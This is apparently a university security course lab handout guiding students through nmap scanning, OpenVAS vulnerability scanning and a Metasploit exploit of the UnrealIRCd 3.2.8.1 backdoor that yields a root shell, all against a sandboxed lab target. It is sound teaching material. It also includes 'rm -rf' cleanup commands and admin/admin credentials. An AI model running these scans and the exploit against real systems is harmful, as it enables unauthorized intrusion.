# CSCD27 Lab 10: Penetration Testing

## Vagrant Setup

Make sure to setup your environment as described in the [Vagrant Setup Guideline](https://github.com/ThierrySans/CSCD27-F16/blob/master/assignments/02/VAGRANT.md).

Make sure to cleanup your directory at the **beginning** and at the **end** od this lab.

```shell
find ~ -follow -depth -name VirtualBox\ VMs -exec rm -rf '{}' \;
find ~ -follow -depth -name .VirtualBox -exec rm -rf '{}' \;
find ~ -follow -depth -name .vagrant.d -exec rm -rf '{}' \;
find ~ -follow -depth  -name .vagrant -exec rm -rf '{}' \;
```

All 3 parts of this lab must be done in the Kali linux box inside assignment 3:

```shell
$ cd ~/cscd27f16_space
$ git pull
$ cd CSCD27-F16/assignment/03/code/part2
$ vagrant up
$ vagrant ssh kali
```

## Nmap - Network Mapping and Host Fingerprinting

In this first part, we are going to use nmap to discover the services running on the target machine. This command exports the results in a file called `target.nmap`:

```shell
$ nmap -O —sV -p0-65535 10.0.1.101 -oN target.nmap
```

## OpenVAS - Vulnerability Scanner

In this first part, we are going to use OpenVAS vulnerability scanner to audit the security of the target:

```shell
$ openvas-setup
$ openvas-start
Starting OpenVas Services
Starting Greenbone Security Assistant: gsad.
Starting OpenVAS Scanner: openvassd.
Starting OpenVAS Manager: openvasmd.
```

**Important:** Make sure that the 4 OpenVAS components have all started correctly without any `ERROR`. If any, stop OpenVAS (`openvas-stop`) and restart it.

Once OpenVAS has correctly started, add the admin user:

```shell
$ openvasmd —create-user=admin
$ openvasmd —new-password=admin —user=admin
```

Finally, scan the target and export (as a pdf) the report through the OpenVAS web interface [https://localhost:9392](https://localhost:9392)

## Metasploit - Exploit Framework

In this third part, we are going to use Metasploit to exploit a vulnerability ([CVE 2010-2075](http://www.cvedetails.com/cve/CVE-2010-2075/)) in UnrealIRCd (version 3.2.8.1). First, let us update and start the metasploit console:

```shell
$ msfupdate
$ service postgresql start
$ msfconsole
```

Thus, we can load, configure and run the exploit:

1. load the `unreal_ircd_3281_backdo­or` exploit

   ```shell
    msf > use exploit/unix/irc/unreal_ircd_3281_backdo­or
    ```
2. show and assign values to the exploit arguments:

    ```shell
    msf > show options
    msf > set RHOST 10.0.1.101
    ```
3. run the exploit

    ```
    msf > exploit
    ```
4. Voila!

    ```
    whoami
    root
    ```

